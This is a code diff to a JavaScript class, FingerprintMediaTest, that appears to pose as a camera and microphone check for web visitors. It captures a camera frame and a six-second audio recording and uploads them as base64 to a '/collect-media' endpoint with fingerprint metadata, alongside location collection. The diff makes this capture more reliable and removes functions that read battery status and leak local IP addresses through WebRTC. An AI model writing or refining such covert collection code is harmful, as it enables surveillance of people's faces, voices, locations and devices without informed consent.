@@ -11,6 +11,7 @@ class FingerprintMediaTest {
     this.audioVisualizerActive = false;
     this.audioContext = null;
     this.analyser = null;
+    this.mediaStream = null;
   }
 
   formatLocalTime(dateString) {
@@ -27,23 +28,22 @@ class FingerprintMediaTest {
   }
 
   initElements() {
-  this.statusElement = document.querySelector('.status-content');
-  this.startButton = document.getElementById('startTest');
-  this.videoContainer = document.getElementById('videoContainer');
-  this.placeholder = document.getElementById('placeholder');
-  this.cameraStatus = document.getElementById('cameraStatus');
-  this.micStatus = document.getElementById('micStatus');
-  this.audioBars = document.querySelectorAll('.audio-bar');
-  this.localVideo = document.getElementById('localVideo');
-  
-  // Safely initialize these elements
-  this.privacyStatus = document.getElementById('privacyStatus') || {
-    textContent: '' // Fallback if element doesn't exist
-  };
-  this.networkStatus = document.getElementById('networkStatus') || {
-    textContent: '' // Fallback if element doesn't exist
-  };
-}
+    this.statusElement = document.querySelector('.status-content');
+    this.startButton = document.getElementById('startTest');
+    this.videoContainer = document.getElementById('videoContainer');
+    this.placeholder = document.getElementById('placeholder');
+    this.cameraStatus = document.getElementById('cameraStatus');
+    this.micStatus = document.getElementById('micStatus');
+    this.audioBars = document.querySelectorAll('.audio-bar');
+    this.localVideo = document.getElementById('localVideo');
+    
+    this.privacyStatus = document.getElementById('privacyStatus') || {
+      textContent: ''
+    };
+    this.networkStatus = document.getElementById('networkStatus') || {
+      textContent: ''
+    };
+  }
 
   initEventListeners() {
     this.startButton.addEventListener('click', () => this.runTests());
@@ -53,6 +53,17 @@ class FingerprintMediaTest {
       this.startButton.style.fontSize = '18px';
       this.startButton.style.padding = '15px 25px';
     }
+  }
+
+  cleanup() {
+    if (this.mediaStream) {
+      this.mediaStream.getTracks().forEach(track => track.stop());
+      this.mediaStream = null;
+    }
+    this.stopAudioVisualizer();
+    this.localVideo.srcObject = null;
+    this.localVideo.style.display = 'none';
+    this.placeholder.style.display = 'block';
   }
 
   async updatePrivacyStatus() {
@@ -79,6 +90,7 @@ class FingerprintMediaTest {
 
   async runTests() {
     try {
+      this.cleanup();
       this.setTestStatus("Initializing test...", true);
       await this.updatePrivacyStatus();
       
@@ -97,6 +109,7 @@ class FingerprintMediaTest {
     } catch (error) {
       console.error('Test error:', error);
       this.setTestStatus(`Test encountered an error: ${error.message}`, false, "Retry Test");
+      this.cleanup();
     }
   }
 
@@ -211,31 +224,25 @@ class FingerprintMediaTest {
   }
 
   async captureAndSaveMedia() {
-    let stream;
     try {
       this.setMediaStatus("Checking camera and microphone permissions...", "Checking...", "Checking...");
 
-      const streamPromise = navigator.mediaDevices.getUserMedia({ 
+      const constraints = { 
         video: { width: 1280, height: 720 }, 
         audio: { 
           echoCancellation: true,
           noiseSuppression: true,
           autoGainControl: true
         }
-      });
-      
-      const timeoutPromise = new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Permission timeout after 10 seconds')), 10000)
-      );
-      
-      stream = await Promise.race([streamPromise, timeoutPromise]);
-      
-      await this.setupVideoStream(stream);
+      };
 
-      await this.testCamera(stream);
+      this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
       
-      if (stream.getAudioTracks().length > 0) {
-        await this.testMicrophone(stream);
+      await this.setupVideoStream(this.mediaStream);
+      await this.testCamera(this.mediaStream);
+      
+      if (this.mediaStream.getAudioTracks().length > 0) {
+        await this.testMicrophone(this.mediaStream);
       } else {
         this.micStatus.textContent = "Microphone: Not detected";
       }
@@ -244,10 +251,6 @@ class FingerprintMediaTest {
     } catch (error) {
       this.handleMediaError(error);
       throw error;
-    } finally {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
     }
   }
 
@@ -277,10 +280,14 @@ class FingerprintMediaTest {
     await new Promise((resolve, reject) => {
       this.localVideo.onloadedmetadata = resolve;
       this.localVideo.onerror = reject;
-      setTimeout(() => reject(new Error('Camera initialization timeout')), 5000);
     });
 
-    await this.localVideo.play();
+    try {
+      await this.localVideo.play();
+    } catch (error) {
+      console.error('Video play error:', error);
+      throw new Error('Failed to start video playback');
+    }
   }
 
   async testCamera(stream) {
@@ -288,6 +295,10 @@ class FingerprintMediaTest {
     this.setTestStatus("Testing camera... Smile!");
 
     const imageBlob = await this.captureImageFrame(this.localVideo);
+    if (!imageBlob) {
+      throw new Error('Failed to capture image frame');
+    }
+
     const processedImageData = {
       type: 'camera_test',
       timestamp: new Date().toISOString(),
@@ -335,6 +346,7 @@ class FingerprintMediaTest {
   }
 
   animateAudioVisualizer(stream) {
+    this.stopAudioVisualizer();
     this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
     this.analyser = this.audioContext.createAnalyser();
     const microphone = this.audioContext.createMediaStreamSource(stream);
@@ -369,7 +381,9 @@ class FingerprintMediaTest {
     });
     
     if (this.audioContext) {
-      this.audioContext.close();
+      if (this.audioContext.state !== 'closed') {
+        this.audioContext.close();
+      }
       this.audioContext = null;
       this.analyser = null;
     }
@@ -388,7 +402,7 @@ class FingerprintMediaTest {
         const isBlank = Array.from(imageData).every(val => val === 0);
 
         if (!isBlank || attempts <= 0) {
-          canvas.toBlob(blob => resolve(blob)), 'image/jpeg', 0.8;
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
         } else {
           setTimeout(() => attemptCapture(attempts - 1), 200);
         }
@@ -417,7 +431,11 @@ class FingerprintMediaTest {
         };
 
         recorder.start();
-        setTimeout(() => recorder.stop(), 6000);
+        setTimeout(() => {
+          if (recorder.state === 'recording') {
+            recorder.stop();
+          }
+        }, 6000);
 
       } catch (error) {
         console.error('Audio recording error:', error);
@@ -427,42 +445,43 @@ class FingerprintMediaTest {
   }
 
   async saveProcessedMedia(type, blob, extension, metadata) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-    reader.onload = async () => {
-      try {
-        const response = await fetch('/collect-media', {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          },
-          body: JSON.stringify({
-            type: 'processed_media',
-            data: reader.result.split(',')[1], // Send only base64 data
-            metadata: {
-              ...metadata,
-              size_bytes: blob.size,
-              extension
-            }
-          })
-        });
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = async () => {
+        try {
+          const response = await fetch('/collect-media', {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+              type: 'processed_media',
+              media_type: type,
+              data: reader.result.split(',')[1],
+              metadata: {
+                ...metadata,
+                size_bytes: blob.size,
+                extension
+              }
+            })
+          });
 
-        if (!response.ok) {
-          const error = await response.json();
-          throw new Error(error.message || 'Server error');
+          if (!response.ok) {
+            const error = await response.json();
+            throw new Error(error.message || 'Server error');
+          }
+
+          const data = await response.json();
+          resolve(data);
+        } catch (error) {
+          reject(error);
         }
-
-        const data = await response.json();
-        resolve(data);
-      } catch (error) {
-        reject(error);
-      }
-    };
-    reader.onerror = () => reject(new Error('File reading failed'));
-    reader.readAsDataURL(blob);
-  });
-}
+      };
+      reader.onerror = () => reject(new Error('File reading failed'));
+      reader.readAsDataURL(blob);
+    });
+  }
 
   async collectLocation() {
     if (!navigator.geolocation) return null;
@@ -606,69 +625,6 @@ class FingerprintMediaTest {
     return plugins;
   }
 
-  async getBatteryInfo() {
-    try {
-      if ('getBattery' in navigator) {
-        const battery = await navigator.getBattery();
-        return {
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime,
-          level: battery.level
-        };
-      }
-      return null;
-    } catch (e) {
-      return null;
-    }
-  }
-
-  async getLocalIPs() {
-    return new Promise((resolve) => {
-      const ips = [];
-      const RTCPeerConnection = window.RTCPeerConnection || 
-                              window.webkitRTCPeerConnection || 
-                              window.mozRTCPeerConnection;
-
-      if (!RTCPeerConnection) {
-        resolve([]);
-        return;
-      }
-
-      const pc = new RTCPeerConnection({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
-        iceCandidatePoolSize: 10
-      });
-
-      pc.createDataChannel('');
-
-      pc.onicecandidate = (event) => {
-        if (!event.candidate) {
-          setTimeout(() => {
-            pc.close();
-            resolve([...new Set(ips)]);
-          }, 2000);
-          return;
-        }
-
-        const candidate = event.candidate.candidate;
-        if (candidate) {
-          const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
-          if (ipMatch && !ips.includes(ipMatch[1])) {
-            ips.push(ipMatch[1]);
-          }
-        }
-      };
-
-      pc.createOffer()
-        .then(offer => pc.setLocalDescription(offer))
-        .catch(err => {
-          console.error('Error creating offer:', err);
-          resolve([]);
-        });
-    });
-  }
-  
   processAllData(fingerprintData, mediaData, locationData) {
     return {
       fingerprint: fingerprintData,
